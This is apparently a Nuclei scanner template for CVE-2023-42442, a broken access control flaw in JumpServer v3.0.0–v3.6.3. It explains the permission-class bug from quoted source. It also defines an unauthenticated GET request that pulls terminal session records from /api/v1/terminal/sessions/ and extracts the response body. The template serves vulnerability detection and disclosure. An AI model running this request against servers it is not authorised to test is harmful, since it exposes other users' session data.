http:
- extractors:
  - dsl:
    - body
    name: termianl-data
    type: dsl
  matchers:
  - status:
    - 200
    type: status
  - condition: and
    type: word
    words:
    - '"id"'
    - '"user"'
    - '"terminal"'
  method: GET
  path:
  - '{{BaseURL}}/api/v1/terminal/sessions/?limit=10'
id: CVE-2023-42442-esonhugh
info:
  author: Esonhugh
  description: "The api /api/v1/terminal/sessions/ permission control is broken and\
    \ can be accessed anonymously. \nhttps://github.com/jumpserver/jumpserver/blob/v3.6.1/apps/terminal/api/session/session.py#L91\n\
    class SessionViewSet(OrgBulkModelViewSet):\n    permission_classes = [RBACPermission\
    \ | IsSessionAssignee]   \nhttps://github.com/jumpserver/jumpserver/blob/v3.6.1/apps/terminal/permissions.py#L10\n\
    class IsSessionAssignee(permissions.BasePermission):\n    def has_object_permission(self,\
    \ request, view, obj):\nclass BasePermission:\n    def has_permission(self, request,\
    \ view):\n        return True\n\nSessionViewSet permission classes set to [RBACPermission\
    \ | IsSessionAssignee], relation is or, so any permission matched will be allowed.\
    \ IsSessionAssignee inherit from BasePermission, BasePermission default has_permission\
    \ set to True\uFF0Cand not awared this at that time.\n"
  name: JumpServer v3.0.0 - v3.6.3 terminal session api broken access control
  severity: high
  tags: jumpserver,unauth,access control
